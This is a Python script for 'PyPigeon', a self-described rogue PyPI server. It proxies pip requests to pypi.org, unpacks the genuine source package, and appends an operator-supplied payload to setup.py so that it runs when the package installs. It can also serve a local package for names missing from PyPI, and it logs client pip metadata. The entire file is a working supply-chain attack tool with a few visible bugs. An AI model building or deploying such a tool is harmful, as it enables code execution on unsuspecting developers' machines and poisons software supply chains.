#!/usr/bin/python3
#pyigeon using letsencrypt
import http.server
import socketserver
import ssl
import argparse
import requests
import urllib.parse
import tarfile
import json
from rich import print as rprint
from rich import print_json as jprint
import io
import re
import os
import sys


class ProxyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
	    
	#handle routing
	def do_GET(self):
		client_ip = self.client_address[0]
		user_agent = self.headers.get('User-Agent')
		parsed_path = urllib.parse.urlparse(self.path)
		if parsed_path.path.startswith('/simple/'):
			if uagent:
				json_part = user_agent.split(' ', 1)[1]
				data = json.loads(json_part)
				pretty_json = json.dumps(data, indent=4)
				rprint("["+client_ip+"] Pip User-Agent: "+user_agent.split(' ', 1)[0])
				jprint(pretty_json)
			rprint("["+client_ip+"] Received index request for "+self.path)
			path_parts = parsed_path.path.split('/')
			global package_name
			package_name = str(path_parts[2])
			self.handle_index_request(package_name, client_ip)
		elif parsed_path.path.startswith('/packages/'):
			rprint("["+client_ip+"] Received package request for "+self.path)
			path_parts = parsed_path.path.split('/')
			package_file = str(path_parts[2])
			self.handle_package_request(package_name, client_ip)
		else:
			self.send_error(404, "Not Found")
	
	#handle requests for package index
	def handle_index_request(self, package_name, client_ip):
		pypi_url = PYPI_URL + package_name + "/json"
		pypi_response = requests.get(pypi_url)
		if pypi_response.status_code == 200:
			data = pypi_response.json()
			if 'urls' in data and len(data['urls']) > 0:
				self.send_response(200)
				self.send_header('Content-Type', 'text/html')
				self.end_headers()
				self.wfile.write(b"<!DOCTYPE html><html><body>")
				package_url = data['urls'][1]['url']
				filename = os.path.basename(urllib.parse.urlparse(package_url).path)
				rprint("["+client_ip+"] Sending link /packages/"+filename+" instead of "+package_url)
				self.wfile.write(f'<a href="/packages/{filename}">{filename}</a><br>'.encode('utf-8'))
				self.wfile.write(b"</body></html>")
			else:
				self.send_error(404, "["+client_ip+"] No package URLs found")
		elif pypi_response.status_code == 404 and lpac:
				self.send_response(200)
				self.send_header('Content-Type', 'text/html')
				self.end_headers()
				self.wfile.write(b"<!DOCTYPE html><html><body>")
				filename = os.path.basename(lpac)
				rprint("["+client_ip+"] Sending link to local file "+filename)
				self.wfile.write(f'<a href="/packages/{filename}">{filename}</a><br>'.encode('utf-8'))
				self.wfile.write(b"</body></html>")
		else:
			self.send_error(404, f"Failed to fetch package information from PyPI.")
			
	#read user supplied package
	def read_file(self, file_path):
		if os.path.isfile(file_path):
			with open(file_path, 'rb') as file:
				return file.read()
		else:
			return None
			
	#handle requests for a package
	def handle_package_request(self, path, client_ip):
		pypi_url = PYPI_URL + path +"/json"
		pypi_response1 = requests.get(pypi_url)
		if pypi_response1.status_code == 200:
			data = pypi_response1.json()
			if 'urls' in data and len(data['urls']) > 1:
				#use the second URL's location
				packageurl = data['urls'][1]['url']
				parsed_url1 = urllib.parse.urlparse(packageurl)
				package_filename = os.path.basename(parsed_url1.path)
				pypi_response = requests.get(packageurl)
			if pypi_response.status_code == 200:
				package_content = pypi_response.content
				if not any([fpayload, cpayload, lpac]):
					modified_package_content = package_content
				else:
					modified_package_content = self.modify_package(package_content, client_ip, package_filename)
				self.send_response(200)
				self.send_header('Content-Type', 'application/gzip')
				self.send_header('Content-Disposition', f'attachment; filename="{package_filename}"')
				self.end_headers()
				rprint("["+client_ip+"] Sending "+package_filename+" back to client")
				self.wfile.write(modified_package_content)
			else:
				rprint("["+client_ip+"] Less than two URLs available for "+package_filename)

		elif pypi_response1.status_code == 404 and lpac:
			package_filename = lpac
			modified_package_content = self.read_file(lpac)
			self.send_response(200)
			self.send_header('Content-Type', 'application/gzip')
			self.send_header('Content-Disposition', f'attachment; filename="{package_filename}"')
			self.end_headers()
			rprint("["+client_ip+"] Sending modified "+package_filename+" back to client")
			self.wfile.write(modified_package_content)
		elif pypi_response.status_code == 404:
			self.send_error(404, "Package not found")

		else:
			rprint(f"["+client_ip+"] Failed to fetch package information. Status code: {pypi_response1.status_code}")

	#modify legitimate package to include our python payload
	def modify_package(self, package_content, client_ip, package_filename):
		try:
			rprint("["+client_ip+"] Exploding "+package_filename+" from pypi.org")
			with io.BytesIO(package_content) as buffer:
				with tarfile.open(fileobj=buffer, mode='r:gz') as tar:
					members = tar.getmembers()
					modified_files = []
					setup_py_found = False

					for member in members:
						if member.name.endswith('setup.py'):
							setup_py_found = True
							setup_py_content = tar.extractfile(member).read().decode('utf-8')
							if cpayload or fpayload:
								rprint("["+client_ip+"] Adding payload to setup.py: "+ (MODIFY_STRING if cpayload else fpayload.name))
								setup_py_content += MODIFY_STRING
							modified_files.append((member, setup_py_content))
						else:
							extracted_file = tar.extractfile(member)
							if extracted_file is not None:
								modified_files.append((member, extracted_file.read()))
					
					if setup_py_found:
						rprint("["+client_ip+"] Re-creating "+package_filename)
						with io.BytesIO() as new_tar_buffer:
							with tarfile.open(fileobj=new_tar_buffer, mode='w:gz') as new_tar:
								for member, content in modified_files:
									tar_info = tarfile.TarInfo(name=member.name)
									if isinstance(content, bytes):
										tar_info.size = len(content)
										new_tar.addfile(tar_info, io.BytesIO(content))
									else:
										tar_info.size = len(content.encode('utf-8'))
										new_tar.addfile(tar_info, io.BytesIO(content.encode('utf-8')))
							new_tar_buffer.seek(0)
							return new_tar_buffer.read()
					else:
						raise Exception("setup.py not found in package")
						return
		except Exception as e:
			raise Exception(f"Internal Server Error: {str(e)}")
			return

	#do not use https.server console logging
	def log_message(self, format, *args):
		return

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="[PyPigeon: Rogue pypi server]", formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument("-p", dest="port", required=True, help="Port to listen on")
	parser.add_argument("-ua", dest="uagent", required=False, help="Displays informative User-Agent from request", action="store_true")
	parser.add_argument("-f", dest="fpayload", required=False, type=argparse.FileType("r", encoding="UTF-8"), help="Set payload from file to append to setup.py")
	parser.add_argument("-c", dest="cpayload", required=False, help="Set payload from commandline [ex: -c print('Haxed')] to appent to setup.py")
	parser.add_argument("-l", dest="lpac", required=False, help="Serve local package")

	args = parser.parse_args()
	PORT = int(args.port)
	uagent = args.uagent
	fpayload = args.fpayload
	cpayload = args.cpayload
	lpac = args.lpac
	
	PYPI_URL = "https://pypi.org/pypi/"
	### REPLACE THESE
	CERT_FILE = "/etc/letsencrypt/live/hostnamehere/fullchain.pem"
	KEY_FILE = "/etc/letsencrypt/live/hostnamehere/privkey.pem"
	MODIFY_STRING = ""
	
	if len(sys.argv)==1:
		parser.print_help(sys.stderr)
		sys.exit(1)
	if fpayload:
		with open(fpayload.name, 'r') as file:
			MODIFY_STRING = file.read().rstrip('\n')
	if cpayload:
		MODIFY_STRING = cpayload
		
	# Create an SSL context
	context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
	context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
	
	# Set up the HTTP server with SSL
	while True:
		try:
			with socketserver.TCPServer(("", PORT), ProxyHTTPRequestHandler) as httpd:
				httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
				rprint(f"[ PyPigeon: pypi server started on port {PORT} ]")
				httpd.serve_forever()
		except KeyboardInterrupt as k:
			res = input(f"\n[ PyPigeon: {k} pressed, Do you really want to exit? y/n ] :")
			if res == 'y':
				rprint("[ PyPigeon: pypi server stopped]")
				sys.exit(1)
			elif res == 'n':
				pass
	
		except Exception as e:
			httpd.server_close()
			rprint(f"[ PyPigeon: pypi server stopped - {e}]")
